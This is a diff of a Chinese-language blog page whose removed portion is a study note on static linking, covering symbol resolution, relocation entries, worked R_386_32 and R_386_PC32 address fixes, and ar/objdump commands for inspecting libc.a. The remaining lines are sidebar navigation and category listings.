-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// a.c</span></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">int</span> shared;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">100</span>;</span><br><span class="line">    swap(&amp;a, &amp;shared);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// b.c</span></span><br><span class="line"><span class="keyword">int</span> shared = <span class="number">1</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">int</span> *a, <span class="keyword">int</span> *b)</span></span>&#123;</span><br><span class="line">    *a ^= *b ^= *a ^= *b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>生成目标文件；</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -c a.c b.c</span><br></pre></td></tr></table></figure>
-
-<p>进行链接；</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ld a.o b.o -e main -o ab</span><br></pre></td></tr></table></figure>
-
-<p>链接后各个段的虚拟地址就确定了；</p>
-<p>接着开始计算各个符号的虚拟地址；</p>
-<p>例如main函数，原本在<code>a.o</code>中与<code>.text</code>的偏移<code>offset</code>为<code>x</code>，链接后，<code>.text</code>的虚拟地址假设为<code>0x08048094</code>，则<code>main</code>的地址为<code>0x08048094 + x</code>；</p>
-<h2 id="符号解析与重定位"><a href="#符号解析与重定位" class="headerlink" title="符号解析与重定位"></a>符号解析与重定位</h2><h3 id="符号解析"><a href="#符号解析" class="headerlink" title="符号解析"></a>符号解析</h3><p><code>a.c</code>中引用了<code>shared</code>变量，并且调用了<code>swap</code>外部函数；</p>
-<p>在<code>a.c</code>编译成<code>a.o</code>时，编译器并不知道<code>shared</code>和<code>swap</code>的地址，因此<code>shared</code>用地址<code>0x0</code>暂时代替，而函数<code>swap</code>则用<code>main+offset</code>来表示（下一条指令的地址，与本行指令机器码指定的<code>offset</code>相加，决定调用的地址）；</p>
-<p>链接器通过重定位表<code>Relocation Table</code>获取哪些部分需要重定位；</p>
-<p>例如当<code>.text</code>中有部分需要重定位，将会有一个<code>.rel.text</code>段保存代码段的重定位信息，<code>.data</code>段类似；</p>
-<p>查看重定位信息，所有引用外部符号的地址；</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -r a.o</span><br></pre></td></tr></table></figure>
-
-<p>每个要重定位的地方有一个重定位入口<code>Relocation Entry</code>，在<code>a.o</code>中就有两个：<code>shared</code>和<code>swap</code>；</p>
-<p>重定位入口的偏移<code>offset</code>代表其在段中的偏移；</p>
-<p>接着，查全局符号表，没查到就是<code>undefined</code>状态，查到就修正地址；</p>
-<h3 id="重定位修正"><a href="#重定位修正" class="headerlink" title="重定位修正"></a>重定位修正</h3><p><img src="/study/book/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB%EF%BC%9A%E9%93%BE%E6%8E%A5%E3%80%81%E8%A3%85%E8%BD%BD%E4%B8%8E%E5%BA%93/static-link/relocation.jpg" alt="relocation"></p>
-<p>假设链接完成后，最终可执行文件中，<code>main</code>的虚拟地址为<code>0x1000</code>，<code>swap</code>的虚拟地址为<code>0x2000</code>，<code>shared</code>的虚拟地址为<code>0x3000</code>；</p>
-<h4 id="绝对寻址修正"><a href="#绝对寻址修正" class="headerlink" title="绝对寻址修正"></a>绝对寻址修正</h4><p>对于<code>shared</code>变量，重定位前，<code>a.o</code>中使用了<code>movl $0x0, 0x4(%esp)</code>来暂时代表<code>shared</code>的地址，即<code>0x0</code>；</p>
-<p>这里的重定位使用了<code>R_386_32</code>的绝对寻址修正，则<code>S = 0x3000</code>，而<code>A = 0x0</code>；</p>
-<p>那么最终重定位入口地址修正为<code>S + A = 0x3000</code>，修正后的指令为<code>movl $0x3000, 0x4(%esp)</code>；</p>
-<h4 id="绝对寻址修正-1"><a href="#绝对寻址修正-1" class="headerlink" title="绝对寻址修正"></a>绝对寻址修正</h4><p>对于<code>swap</code>函数，重定位前，<code>a.o</code>中使用了</p>
-<p><img src="/study/book/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB%EF%BC%9A%E9%93%BE%E6%8E%A5%E3%80%81%E8%A3%85%E8%BD%BD%E4%B8%8E%E5%BA%93/static-link/relocation1.jpg"></p>
-<p>这里的重定位使用了<code>R_386_PC32</code>的相对寻址修正，则<code>S=0x2000</code>，<code>A = 0xfffffffc = -4</code>，<code>A</code>即为机器码<code>0xfffffffc</code>，而<code>P = 0x1000 + 0x27</code>，是被修正的虚拟地址；</p>
-<p>最后重定位入口地址修正为<code>S + P - A = 0x2000 + (-4) - 0x1027 = 0xfd5</code>，即最后<code>call 0xfd5</code>；</p>
-<p>下一条指令的地址加上当前call的地址，正好就是<code>swap</code>函数的地址，即：<code>102b + fd5 = 0x2000</code></p>
-<p><img src="/study/book/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB%EF%BC%9A%E9%93%BE%E6%8E%A5%E3%80%81%E8%A3%85%E8%BD%BD%E4%B8%8E%E5%BA%93/static-link/relocation2.jpg"></p>
-<h2 id="静态库链接"><a href="#静态库链接" class="headerlink" title="静态库链接"></a>静态库链接</h2><p>交互使用操作系统提供的API；</p>
-<p>开发环境中的语言库<code>Language Library</code>就是对操作系统API的封装；</p>
-<p>查看一个文件包含的目标文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ar -t libc.a</span><br></pre></td></tr></table></figure>
-
-<p>将这些目标文件都提取出来</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ar -x libc.a</span><br></pre></td></tr></table></figure>
-
-<p>查看某个函数在那个目标文件中</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -t libc.a | grep func</span><br></pre></td></tr></table></figure>
-
-<p>打印链接的过程</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -static --verbose -fno-builtin hello.c</span><br></pre></td></tr></table></figure>
-
-<ol>
-<li>cc1编译成.s文件</li>
-<li>as汇编成.o文件</li>
-<li>collect2链接</li>
-</ol>
-
-        
-        
-          <blockquote id="copyright">
-              <p>原文链接: <a href="https://www.jk404.cn/page/2/index.html">https://www.jk404.cn/page/2/index.html</a></p>
-              <p>版权声明: 转载请注明出处.</p>
-          </blockquote>
-        
-      
-    </div>
-    <footer class="article-footer">
-      
-        <div class="article-tag-wrap">
-          
-
-          
-          
-
-
-        </div>
-      
-      
-      
-    </footer>
-  </div>
-</article>
-
-
 
     <nav id="page-nav">
 
@@ -1760,23 +1838,23 @@
       <ul>
         
           <li>
+            <a href="/study/book/%E6%8F%AD%E7%A7%98%E5%AE%B6%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A80day%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E6%9C%AF/router-vuln-overflow/">router_vuln_overflow</a>
+          </li>
+        
+          <li>
+            <a href="/study/book/%E6%8F%AD%E7%A7%98%E5%AE%B6%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A80day%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E6%9C%AF/router-vuln-backdoor/">router-vuln-backdoor</a>
+          </li>
+        
+          <li>
+            <a href="/study/book/%E6%8F%AD%E7%A7%98%E5%AE%B6%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A80day%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E6%9C%AF/router-vuln-web/">router-vuln-web</a>
+          </li>
+        
+          <li>
             <a href="/course/MIT-AI/MIT-AI-0x01/">MIT_AI_0x01</a>
           </li>
         
           <li>
             <a href="/study/book/%E6%8F%AD%E7%A7%98%E5%AE%B6%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A80day%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E6%9C%AF/router-vuln-analysis-skill/">router_vuln_analysis_skill</a>
-          </li>
-        
-          <li>
-            <a href="/study/book/%E6%8F%AD%E7%A7%98%E5%AE%B6%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A80day%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E6%9C%AF/router-vuln-environ/">router_vuln_environ</a>
-          </li>
-        
-          <li>
-            <a href="/study/book/%E6%8F%AD%E7%A7%98%E5%AE%B6%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A80day%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E6%9C%AF/router-vuln-basic-knowledge/">router_vuln_basic_knowledge</a>
-          </li>
-        
-          <li>
-            <a href="/PWN/cve/CVE-2010-2883/">CVE-2010-2883</a>
           </li>
         
       </ul>
@@ -1791,7 +1869,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title"><i class="fa fa-classify"></i> 分类</h3>
     <div class="widget">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CSAPP-lab/">CSAPP-lab</a><span class="category-list-count">3</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CSAPP-lab/bomblab/">bomblab</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CSAPP-lab/datalab/">datalab</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CSAPP-lab/preparelab/">preparelab</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a><span class="category-list-count">30</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/">PWN</a><span class="category-list-count">30</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/kernel-pwn/">kernel pwn</a><span class="category-list-count">13</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/kernel-pwn/FUZZ/">FUZZ</a><span class="category-list-count">3</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/kernel-pwn/FUZZ/Syzkaller/">Syzkaller</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/kernel-pwn/FUZZ/Trinity/">Trinity</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/kernel-pwn/Linux-source/">Linux source</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/kernel-pwn/cve/">cve</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/kernel-pwn/knowledge/">knowledge</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/kernel-pwn/wp/">wp</a><span class="category-list-count">3</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/uncategorized/">uncategorized</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/user-space-pwn/">user space pwn</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/user-space-pwn/cve/">cve</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/wp/">wp</a><span class="category-list-count">12</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/wp/asisctf/">asisctf</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/wp/asisctf/asisctf2021/">asisctf2021</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/wp/buuoj/">buuoj</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/wp/l3hctf/">l3hctf</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/wp/pwnable-kr/">pwnable.kr</a><span class="category-list-count">7</span></li></ul></li></ul></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/OS/">OS</a><span class="category-list-count">13</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/OS/lab1/">lab1</a><span class="category-list-count">13</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/OS/lab1/challenge1-what-is-make/">challenge1:what is make</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/OS/lab1/challenge2-qemu-gdb/">challenge2:qemu&gdb</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/OS/lab1/challenge3-go-into-protected-mode/">challenge3:go into protected mode</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/OS/lab1/challenge4-load-kernel-elf/">challenge4:load kernel elf</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/OS/lab1/challenge5-trace-stackframe/">challenge5:trace stackframe</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/OS/lab1/challenge6-interrupt-handle/">challenge6:interrupt handle</a><span class="category-list-count">3</span></li></ul></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/PWN/">PWN</a><span class="category-list-count">2</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/PWN/Fuzz/">Fuzz</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/PWN/Fuzz/AFL/">AFL</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/PWN/cve/">cve</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/course/">course</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/course/MIT-AI/">MIT-AI</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/study/">study</a><span class="category-list-count">13</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/study/book/">book</a><span class="category-list-count">10</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/study/book/%E6%8F%AD%E7%A7%98%E5%AE%B6%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A80day%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E6%9C%AF/">揭秘家用路由器0day漏洞挖掘技术</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/study/book/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB%EF%BC%9A%E9%93%BE%E6%8E%A5%E3%80%81%E8%A3%85%E8%BD%BD%E4%B8%8E%E5%BA%93/">程序员的自我修养：链接、装载与库</a><span class="category-list-count">7</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/study/daily/">daily</a><span class="category-list-count">3</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/tools/">tools</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/welcome/">welcome</a><span class="category-list-count">1</span></li></ul>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CSAPP-lab/">CSAPP-lab</a><span class="category-list-count">3</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CSAPP-lab/bomblab/">bomblab</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CSAPP-lab/datalab/">datalab</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CSAPP-lab/preparelab/">preparelab</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a><span class="category-list-count">30</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/">PWN</a><span class="category-list-count">30</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/kernel-pwn/">kernel pwn</a><span class="category-list-count">13</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/kernel-pwn/FUZZ/">FUZZ</a><span class="category-list-count">3</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/kernel-pwn/FUZZ/Syzkaller/">Syzkaller</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/kernel-pwn/FUZZ/Trinity/">Trinity</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/kernel-pwn/Linux-source/">Linux source</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/kernel-pwn/cve/">cve</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/kernel-pwn/knowledge/">knowledge</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/kernel-pwn/wp/">wp</a><span class="category-list-count">3</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/uncategorized/">uncategorized</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/user-space-pwn/">user space pwn</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/user-space-pwn/cve/">cve</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/wp/">wp</a><span class="category-list-count">12</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/wp/asisctf/">asisctf</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/wp/asisctf/asisctf2021/">asisctf2021</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/wp/buuoj/">buuoj</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/wp/l3hctf/">l3hctf</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/PWN/wp/pwnable-kr/">pwnable.kr</a><span class="category-list-count">7</span></li></ul></li></ul></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/OS/">OS</a><span class="category-list-count">13</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/OS/lab1/">lab1</a><span class="category-list-count">13</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/OS/lab1/challenge1-what-is-make/">challenge1:what is make</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/OS/lab1/challenge2-qemu-gdb/">challenge2:qemu&gdb</a><span class="category-list-count">4</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/OS/lab1/challenge3-go-into-protected-mode/">challenge3:go into protected mode</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/OS/lab1/challenge4-load-kernel-elf/">challenge4:load kernel elf</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/OS/lab1/challenge5-trace-stackframe/">challenge5:trace stackframe</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/OS/lab1/challenge6-interrupt-handle/">challenge6:interrupt handle</a><span class="category-list-count">3</span></li></ul></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/PWN/">PWN</a><span class="category-list-count">2</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/PWN/Fuzz/">Fuzz</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/PWN/Fuzz/AFL/">AFL</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/PWN/cve/">cve</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/course/">course</a><span class="category-list-count">1</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/course/MIT-AI/">MIT-AI</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/study/">study</a><span class="category-list-count">16</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/study/book/">book</a><span class="category-list-count">13</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/study/book/%E6%8F%AD%E7%A7%98%E5%AE%B6%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A80day%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%8A%80%E6%9C%AF/">揭秘家用路由器0day漏洞挖掘技术</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/study/book/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB%EF%BC%9A%E9%93%BE%E6%8E%A5%E3%80%81%E8%A3%85%E8%BD%BD%E4%B8%8E%E5%BA%93/">程序员的自我修养：链接、装载与库</a><span class="category-list-count">7</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/study/daily/">daily</a><span class="category-list-count">3</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/tools/">tools</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/welcome/">welcome</a><span class="category-list-count">1</span></li></ul>
     </div>
   </div>
 
@@ -1801,7 +1879,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title"><i class="fa fa-archive"></i> 归档</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/">2021年12月</a><span class="archive-list-count">65</span></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/">2021年12月</a><span class="archive-list-count">68</span></li></ul>
     </div>
   </div>
 
